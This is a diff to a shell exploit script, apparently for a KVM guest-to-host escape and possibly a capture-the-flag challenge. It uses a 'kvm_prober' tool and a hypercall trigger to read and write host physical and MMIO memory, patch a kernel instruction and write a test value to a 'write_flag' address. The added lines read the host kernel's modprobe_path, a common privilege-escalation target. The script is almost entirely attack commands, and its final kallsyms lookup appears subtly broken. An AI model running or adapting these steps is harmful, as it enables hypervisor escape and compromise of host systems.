@@ -119,7 +119,7 @@ echo "triggering hypercall..."
 sleep 2
 echo "reading write_flag address before write..."
 # Read to write flag (PA)
-kvm_prober readmmio_val 0x026279a8 0 8
+kvm_prober readmmio_val 0x026279a8 8
 ./trigger_hypercall_100
 
 sleep 2
@@ -131,19 +131,19 @@ kvm_prober pathinstr 0xffffffff8304f080 DEAD
 sleep 2
 echo "reading write_flag physical address after virtual address write"
 # Read to write flag (PA)
-kvm_prober readmmio_val 0x026279a8 0 8
+kvm_prober readmmio_val 0x026279a8 8
 ./trigger_hypercall_100
 
 sleep 2
 echo "writing to write_flag address..."
 # Write to write flag (PA)
-kvm_prober writemmio_val 0x026279a8 0 8
+kvm_prober writemmio_val 0x026279a8 deadbeef41424344 8
 ./trigger_hypercall_100
 
 sleep 2
 echo "reading write_flag address after write..."
 # Read to write flag (PA)
-kvm_prober readmmio_val 0x026279a8 0 8
+kvm_prober readmmio_val 0x026279a8 8
 ./trigger_hypercall_100
 
 sleep 2
@@ -154,4 +154,8 @@ kvm_prober readmmio_val 0x02b5ee10 8
 
 sleep 2
 
-echo "all done"
+echo "reading host modprobe_path"
+kvm_prober readkvmem ffffffff8265cca0 64
+
+sleep 2
+kvm_prober readkvmem "$(cat /proc/kallsyms | grep modprobe_path)" 64
